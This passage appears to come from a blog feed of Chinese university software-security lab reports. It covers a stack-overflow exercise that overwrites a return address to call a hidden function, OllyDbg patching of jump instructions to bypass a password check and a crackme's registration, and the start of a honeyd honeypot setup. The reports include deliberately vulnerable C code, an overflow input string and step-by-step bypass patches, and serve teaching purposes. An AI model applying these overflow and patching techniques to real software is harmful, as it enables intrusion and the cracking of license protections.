title="思考题"></a>思考题</h1><ul><li>以<code>StackOverrun</code>程序为靶子，通过自己使用<code>ollydbg</code>调试，两个要求：其一，要求分析PE格式加载到内存中的地址变化；其二，挑选其中一处函数的跳转，详细分析，跳转时<code>sp</code>，<code>bp</code>，<code>ip</code>的变化，要求以程序运行的顺序记录跳转时的这些寄存器的变化。</li><li>在不修改源代码的情况下，修改<code>StackOverrun</code>程序的流程，通过淹没返回地址，用<code>jmp esp</code>的方式，让其调用<code>bar</code>函数并输出结果</li></ul><h2 id="分析源代码"><a href="#分析源代码" class="headerlink" title="分析源代码"></a>分析源代码</h2><p>程序由三个函数组成，一个<code>main</code>函数，两个子函数<code>foo</code>和<code>bar</code>,main函数打印两个子函数的起始地址并调用<code>foo</code>函数。<code>foo</code>函数打印当前栈顶向下<code>40</code>个字节的地址，bar函数打印一串字符串，正常情况下程序不会调用<code>bar</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//What? No extra arguments supplied to printf?</span></span><br><span class="line">    <span class="comment">//It's a cheap trick to view the stack 8-)</span></span><br><span class="line">    <span class="comment">//We'll see this trick again when we look at format strings.</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"My stack looks like:\n%p\n%p\n%p\n%p\n%p\n% p\n%p\n%p\n%p\n%p\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Pass the user input straight to secure code public enemy #1.</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now the stack looks like:\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Augh! I've been hacked!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//Blatant cheating to make life easier on myself</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Address of foo = %p\n"</span>, foo);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Address of bar = %p\n"</span>, bar);</span><br><span class="line">   </span><br><span class="line">foo(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析内存地址变化"><a href="#分析内存地址变化" class="headerlink" title="分析内存地址变化"></a>分析内存地址变化</h2><p>根据程序显示，<code>foo()</code>的起始地址为<code>0x00401000</code>,<code>bar()</code>的起始地址为<code>00401060</code>,分析汇编代码知道<code>main()</code>函数的起始地址为<code>0x00401070</code>，在这三个位置分别设置断点，然后进行调试分析。</p><ol><li><p>把入口地址<code>0x00401000</code>压入栈中</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834365217.png" alt="1565834365217"></p></li><li><p>把要打印的<code>Address of foo = %p</code>的地址<code>0x004070DC</code>压入栈中并转到地址<code>0x004010B0</code>处</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834372312.png" alt="1565834372312"></p></li><li><p>执行返回后，将栈顶指针<code>ESP</code>地址增加<code>8</code>字节，<code>ADD ESP,8</code></p></li><li><p>把入口地址<code>0x00401000</code>压入栈中</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834378838.png" alt="1565834378838"></p></li><li><p>把要打印的<code>Address of bar = %p</code>的地址<code>0x004070C4</code>压入栈中并转到地址<code>0x004010B0</code>处</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834384587.png" alt="1565834384587"></p></li><li><p>将<code>ECX</code>压入栈中</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834389557.png" alt="1565834389557"></p></li><li><p>将返回地址<code>0x0040109E</code>压入栈中，并跳转到地址<code>0x00401000</code>处即跳转到函数<code>foo</code>处</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834395688.png" alt="1565834395688"></p></li><li><p>将<code>ESP</code>地址降低<code>0x0C</code>字节<code>SUB ESP,0C</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834400315.png" alt="1565834400315"></p></li><li><p>将<code>ESI</code>和<code>EDI</code>压入栈</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834406262.png" alt="1565834406262"></p></li><li><p>把要打印的<code>My stack looks like: %p%p %p %p %p %p %p %p %p %p</code>的地址<code>0x00407070</code>压入栈中并转到地址<code>0x004010B0</code>处</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834411915.png" alt="1565834411915"></p></li><li><p>执行返回后，将栈顶指针<code>ESP</code>地址增加<code>4</code>字节，<code>ADD ESP,4</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834418120.png" alt="1565834418120"></p></li><li><p>程序执行到<code>0x0040101B</code>处便无法执行已经执行完毕</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834422939.png" alt="1565834422939"></p></li></ol><h2 id="分析sp-bp-ip变化"><a href="#分析sp-bp-ip变化" class="headerlink" title="分析sp,bp,ip变化"></a>分析<code>sp</code>,<code>bp</code>,<code>ip</code>变化</h2><p>分析程序由<code>main()</code>函数跳转到<code>foo</code>函数时<code>sp</code>,<code>bp</code>,<code>ip</code>的变化</p><ol><li><p>在程序跳转之前位于地址<code>0x00401098</code>处，操作是将<code>ECX</code>压入栈</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834540332.png" alt="1565834540332"></p><p>此时各个寄存器的情况如下，<code>ECX</code>的值为<code>0x00000000</code>，<code>ESP</code>的值为<code>0x0012FF7C</code>,<code>EBP</code>的值为<code>0x0012FFC0</code>，EIP的值为<code>0x00401098</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834562756.png" alt="1565834562756"></p><p>内存分布情况如下图所示</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834577380.png" alt="1565834577380"></p></li><li><p>向下执行一步，此时<code>ECX</code>已经入栈，各个寄存器的情况如下,<code>ESP</code>向上移动四个字节，值为<code>0x0012FF78</code>，EBP的值不变，为<code>0x0012FFC0</code>，<code>EIP</code>的值为<code>0x00401099</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834608803.png" alt="1565834608803"></p><p>内存分布情况如下图所示</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834620098.png" alt="1565834620098"></p></li><li><p>执行<code>CALL stack0ve.00401000</code>进行跳转，各个寄存器的情况如下，<code>ESP</code>向上移动四个字节，值为<code>0x0012FF74</code>, <code>EBP</code>的值不变，为<code>0x0012FFC0</code>，<code>EIP</code>的值为<code>0x00401000</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834665736.png" alt="1565834665736"></p><p>内存分布情况如下图所示，新增加的栈顶存储的是<code>main()</code>函数的返回地址<code>0x0040109E</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834685709.png" alt="1565834685709"></p></li><li><p>继续执行<code>SUB ESP,0C</code>，栈顶向上移动<code>12</code>字节，各个寄存器的情况如下，<code>ESP</code>值为<code>0x0012FF68</code>, <code>EBP</code>的值不变，为<code>0x0012FFC0</code>，<code>EIP</code>的值为<code>0x00401003</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834727293.png" alt="1565834727293"></p><p>内存分布情况如下图所示，新增加的栈从<code>0x0012FF6C</code>至<code>0x0012FF73</code>没有存储任何值，<code>0x0012FF68</code>至<code>0x0012FF6B</code>存储的是地址<code>0x00407128</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834768220.png" alt="1565834768220"></p></li><li><p>小结：函数跳转时先将调用参数入栈(<code>0x0012FF78</code>)，然后将返回地址入栈(<code>0X0012FF74</code>)，最后将局部参数入栈(<code>0x0012FF68-0x0012FF73</code>)</p></li></ol><h2 id="修改StackOverrun程序的流程"><a href="#修改StackOverrun程序的流程" class="headerlink" title="修改StackOverrun程序的流程"></a>修改<code>StackOverrun</code>程序的流程</h2><p>通过淹没返回地址，用<code>jmp esp</code>的方式，让其调用<code>bar()</code>函数并输出结果</p><ol><li><p>程序运行结果如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834834550.png" alt="1565834834550"></p><p>根据上述分析和程序运行结果可知输出的十个地址中，<code>0x0040109E</code>为<code>main()</code>函数的返回地址。根据源代码分析，只需在程序后输入地址覆盖<code>0x0040109E</code>为<code>0x00401060</code>即可</p></li><li><p>在程序后输入 “<strong>AAAAAAAAAAAAAAAAAAAA`@</strong>“ ，其中 “*<em>`@ *</em>“的十六进制<code>ASCII码</code>为<code>0x601040</code>得到结果如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565835109100.png" alt="1565835109100"></p></li><li><p>发现输出的是个地址中最上面的两个与程序后面输入的内容无关，故输入为“<strong>AAAAAAAAAAAA`@</strong> ”，程序运行结果如下，成功调用<code>bar()</code>函数并输出结果</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565835211633.png" alt="1565835211633"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件安全实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>缓冲区溢出 实验报告</title>
      <link href="/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html"/>
      <url>/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol><li>读懂并能够独立编写密码验证的小程序。 </li><li>运行 <code>Ollydbg</code>，并学习用其调试密码验证小程序。 </li><li>通过修改汇编语句来修改程序的判断条件，改变程序的运行路线。 <a id="more"></a></li></ol><h1 id="理解程序"><a href="#理解程序" class="headerlink" title="理解程序"></a>理解程序</h1><p>阅读并理解代码 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">"1234567"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span> <span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> authenticated;</span><br><span class="line">authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line"><span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"please input password:       "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,password);</span><br><span class="line">valid_flag = verify_password(password);</span><br><span class="line"><span class="keyword">if</span>(valid_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"incorrect password!\n\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Congratulation! You have passed the verification!\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>在主函数内输入密码<code>password</code>；</li><li>跳转到子函数<code>verify_password()</code>判断输入的密码是否正确即判断输入的密码<code>password</code>与正确的密码<code>PASSWORD</code>是否相等,如果相等则子函数返回0，否则返回非0；</li><li>主函数在判断子函数<code>verify_password()</code>返回值：如果是0，则输出<code>Congratulation! You have passed theverification!</code>，结束程序，否则输出<code>incorrect password!</code>，继续输入密码<code>password</code>重复上述过程。</li></ol><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565795262719.png" alt="1565795262719"></p><h1 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h1><ol><li><p>使用<code>Ollydbg</code>打开程序</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565795381042.png" alt="1565795381042"></p></li><li><p>同时按下<code>Alt</code>和<code>F9</code>执行到用户代码如下图：在地址为<code>00401614</code>处<code>CALL test.00401014</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565795418251.png" alt="1565795418251"></p></li><li><p>找到地址<code>00401014</code>处 <code>JMP test.main</code>，即此处向下为用户代码</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565795448209.png" alt="1565795448209"></p></li><li><p>分析用户代码，发现<code>00401030</code>至<code>0040106F</code>为子函数<code>verify_password()</code>反汇编代码，<code>00401080</code>至<code>0040111C</code>为<code>main</code>函数的反汇编代码</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565795482563.png" alt="1565795482563"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565795488088.png" alt="1565795488088"></p></li><li><p>分析反汇编代码，发现在<code>004010E1</code>处，出现指令<code>CMP</code>比较子函数的返回值与0，如果等于0，则执行接下来的<code>004010E5</code>处<code>JE SHORT test.00401105</code>处的指令，即打印<code>Congratulation! You have passed the verification!</code>；否则打印<code>incorrect password!</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565795609568.png" alt="1565795609568"></p></li><li><p>程序运行的结构图如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565795720516.png" alt="1565795720516"></p></li></ol><h1 id="修改程序"><a href="#修改程序" class="headerlink" title="修改程序"></a>修改程序</h1><p>已知：</p><table><thead><tr><th align="center">编码</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center"><code>JE</code></td><td align="center">等于则跳转</td></tr><tr><td align="center"><code>JNZ</code></td><td align="center">不等于则跳转</td></tr></tbody></table><p>地址<code>004010E5</code>处指令<code>JE SHORT test.00401105</code>表示<code>CMP</code>指令比较的两个数相同则跳转到地址<code>00401105</code>处，即打印<code>Congratulation! You have passed the verification!</code>，否则按地址顺序执行，即打印<code>incorrect password!</code></p><p>为此，我们将<code>JE</code>修改为<code>JNZ</code>并执行程序</p><ol><li><p>右键点击<code>JE</code>、找到二进制、点击编辑，或直接<code>Ctrl+E</code>，编辑代码，将<code>74</code>改成<code>75</code>，因为<code>74</code>代表<code>JE</code>，<code>75</code>代表<code>JNZ</code>，或直接双击<code>JE</code>更改该汇编语言由<code>JE</code>至<code>JNZ</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797357774.png" alt="1565797357774"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797362376.png" alt="1565797362376"></p></li><li><p>再次运行，当输入密码为<code>1234567</code>时显示<code>incorrect password!</code>，输入其它内容时直接退出程序。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797406931.png" alt="1565797406931"></p></li><li><p>修改成功，即把结构中的选择语句中的N和Y调换位置</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797422793.png" alt="1565797422793"></p></li></ol><h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><p>破解<code>crackme.exe</code>程序，要求通过修改程序代码的方式绕过<code>crackme.exe</code>的密码验证逻辑，至少采用<strong>2</strong>种破解方式方法。</p><ol><li><p>用<code>Ollydbg</code>打开<code>crackme.exe</code>文件</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797561858.png" alt="1565797561858"></p></li><li><p>右键→查找→所有参考文本字串</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797574854.png" alt="1565797574854"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797587429.png" alt="1565797587429"></p></li><li><p>双击<code>ASCII ‘crackmepassword’</code>,跳转到文件汇编语言<code>crackmepassword</code>处找到四个条件选择语句</p></li><li><p>利用<code>IDA</code>打开<code>crackme.exe</code>文件，搜索字符串同样双击<code>ASCII ‘crackmepassword’</code>得到如下结果</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797649027.png" alt="1565797649027"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797665901.png" alt="1565797665901"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797680979.png" alt="1565797680979"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797701037.png" alt="1565797701037"></p></li><li><p>分析汇编指令可知<strong>必须让程序执行<code>00401616</code>处的指令而不能执行<code>00401637</code>处的指令</strong>。而在不知道密码的情况下会执行<code>0040161E</code>处的指令进行跳转，故要实现绕过密码登录就有需要不进行跳转，可以<strong>将<code>0040161E</code>处<code>JNZ</code>指令改为<code>JE</code>指令</strong>实现不跳转，该方法为方法一。</p></li><li><p>通过分析四条选择语句，得到结论如下</p><table><thead><tr><th align="center">地址</th><th align="center">是否跳转</th></tr></thead><tbody><tr><td align="center">004015F1</td><td align="center">JE不跳转</td></tr><tr><td align="center">004015F5</td><td align="center">JE不跳转</td></tr><tr><td align="center">00401601</td><td align="center">JNZ跳转</td></tr><tr><td align="center">0040160B</td><td align="center">JNZ跳转</td></tr></tbody></table><p>再次分析该部分程序只有程序在<code>004015F1</code>处不跳转、在<code>004015F5</code>跳转时，根据寄存器的值才能判断出程序在<code>0040161E</code>处不跳转即不执行<code>00401637</code>处指令，故方法二是<strong>将<code>004015F1</code>处<code>JNZ</code>指令改为<code>JE</code>指令，将<code>004015F5</code>处<code>JE</code>指令改为<code>JNZ</code>指令</strong>。</p></li><li><p>执行结果</p><ul><li><p>方法一</p><ol><li><p>将<code>JNZ</code>指令改为<code>JE</code>指令</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565798121426.png" alt="1565798121426"></p></li><li><p><code>右键单击→复制到可执行文件→所有修改→全部复制→右键单击→保存文件→选择文件路径</code>，将更改后的文件保存为<code>crackme1.exe</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565798154333.png" alt="1565798154333"></p></li><li><p>打开<code>crackme1.exe</code>，随便输入一个用户名和密码点击注册，显示注册成功</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565798200923.png" alt="1565798200923"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565798191459.png" alt="1565798191459"></p></li></ol></li><li><p>方法二</p><ol><li><p>将<code>004015F1</code>处<code>JNZ</code>指令改为<code>JE</code>指令，将<code>004015F5</code>处<code>JE</code>指令改为<code>JNZ</code>指令</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565798278535.png" alt="1565798278535"></p></li><li><p>与方法一相同，将更改后的文件保存为<code>crackme2.exe</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565798297876.png" alt="1565798297876"></p></li><li><p>打开<code>crackme1.exe</code>，随便输入一个用户名和密码点击注册，显示注册成功</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565798319089.png" alt="1565798319089"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565798324932.png" alt="1565798324932"></p></li></ol></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件安全实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 缓冲区溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蜜罐攻击检测 实验报告</title>
      <link href="/%E8%9C%9C%E7%BD%90%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html"/>
      <url>/%E8%9C%9C%E7%BD%90%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol><li>使用<code>honeyd</code>软件实现低交互蜜罐，要求能够模拟主机、服务、漏洞和网络拓扑。</li><li>在虚拟机上部署具有可利用漏洞的系统、软件或网站。</li><li>使用扫描器、<code>metasploit</code>等攻击工具对网络靶场进行攻击，达到扫描探测、信息获取、获取管理员权限、窃取管理员密码、拒绝服务、文件篡改、进程操作等攻击效果。</li><li>物理蜜罐上使用入侵检测工具<code>snort</code>，或编写信息采集、日志分析代码，检测并记录受到的攻击。记录形式如：日志文件、告警文件、实时显示等方式。<a id="more"></a></li></ol><h1 id="安装配置Honeyd"><a href="#安装配置Honeyd" class="headerlink" title="安装配置Honeyd"></a>安装配置<code>Honeyd</code></h1><h2 id="Honeyd及其依赖项简介"><a href="#Honeyd及其依赖项简介" class="headerlink" title="Honeyd及其依赖项简介"></a>Honeyd及其依赖项简介</h2><p>​        <code>Honeyd</code>是一个可以在网络上创建虚拟主机的小型<code>daemon</code>。可以对此虚拟主机的服务和TCP进行配置，使其在网络中看起来是在运行某种操作系统。<code>Honeyd</code>可以使一台主机在局域网中模拟出多个地址以满足网络实验环境的要求。通过对配置文件进行设置可以使虚拟计算机模拟运行任何服务。也可以使用服务代理替代服务模拟。</p><ol><li><code>libevent</code>,一个非同步事件通知的函数库。通过使用<code>libevent</code>，开发者能够设定某些事件发生时所运行的函数，能够取代以往程序所使用的循环检查。</li><li><code>libdnet</code>，为若干个低层的网络例程提供了一个简单的可移植的接口，包括网络地址处理，内核 <code>arp</code> 缓冲和路由表查找和管理，网络防火墙（<code>IP filter</code>, <code>ipfw</code>, <code>ipchains</code>, <code>pf</code>, <code>PktFilter</code>, …)，网络接口查找和管理，IP 隧道（<code>BSD/Linux tun</code>, <code>Universal TUN/TAP device</code>)，未加工的 IP 包和以太网帧的传输。</li><li><code>libpcap</code>，<code>unix/linux</code>平台下的网络数据包捕获函数包，大多数网络监控软件都以它为基础。<code>Libpcap</code> 可以在绝大多数类 <code>unix</code>平台下工作。</li><li><code>arpd</code>，执行在与<code>honeyd</code>同样的系统上。是<code>honeyd</code>众多协作工具中最重要的一个。<code>Arpd</code>工作时监视局域网内的流量。并通过查看<code>honeyd</code>系统的<code>ARP表</code>推断其他系统的活动与否。<code>arpd</code>将对指定的 IP 地址范围内未使用的 IP 用 <code>honeyd</code>主机的 <code>MAC 地址</code>做出<code>arp应答</code>。</li><li><code>zlib</code>，<code>Linux</code>核心使用<code>zlib</code>以实作网络协定的压缩、档案系统的压缩以及开机时解压缩自身的核心。</li></ol><h2 id="安装Honeyd及其依赖项"><a href="#安装Honeyd及其依赖项" class="headerlink" title="安装Honeyd及其依赖项"></a>安装Honeyd及其依赖项</h2><ol><li><p>从官网下载安装<code>honeyd-1.5c</code></p><p>下载地址<a href="http://www.honeyd.org/release.php" target="_blank" rel="noopener">http://www.honeyd.org/release.php</a></p></li><li><p>下载解压编译安装honeyd的依赖库：<code>libevent</code>、<code>libdumbnet</code>、<code>libpcap</code>、<code>libedit</code>，参考<a href="https://www.cnblogs.com/yjbjingcha/p/6791631.html" target="_blank" rel="noopener">https://www.cnblogs.com/yjbjingcha/p/6791631.html</a></p></li><li><p>安装<code>arpd-0.2</code>库</p></li><li><p>成功安装<code>honeyd</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565763010078.png" alt="1565763010078"></p></li></ol><h2 id="网络拓扑结构"><a href="#网络拓扑结构" class="headerlink" title="网络拓扑结构"></a>网络拓扑结构</h2><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767984997.png" alt="1565767984997"></p><h2 id="日志及配置文件"><a href="#日志及配置文件" class="headerlink" title="日志及配置文件"></a>日志及配置文件</h2><ol><li><p>日志文件及位置为<code>/var/log/honeyd/honeyd.log</code>和<code>/var/log/honeyd/service.log</code></p></li><li><p><code>honeyd</code>配置文件及位置为<code>/root/桌面/honeyd.conf</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">route entry 192.168.43.153 network 192.168.43.144/28   </span><br><span class="line">route 192.168.43.153 link 192.168.43.152/29  </span><br><span class="line"></span><br><span class="line">route 192.168.43.153 add net 192.168.43.156/30 192.168.43.157</span><br><span class="line">route 192.168.43.157 link 192.168.43.165/30</span><br><span class="line"></span><br><span class="line">create windows</span><br><span class="line">set windows personality "Microsoft Windows 2000 SP2"   </span><br><span class="line">set windows default tcp action reset   </span><br><span class="line">set windows default udp action reset   </span><br><span class="line">set windows default icmp action open</span><br><span class="line">add windows tcp port 110 "/usr/share/honeyd-1.5c/scripts/pop3.pl"</span><br><span class="line">add windows tcp port 80 "/usr/share/honeyd-1.5c/scripts/web.sh"</span><br><span class="line">add windows tcp port 25 "/usr/share/honeyd-1.5c/scripts/smtp.pl"</span><br><span class="line">add windows tcp port 23 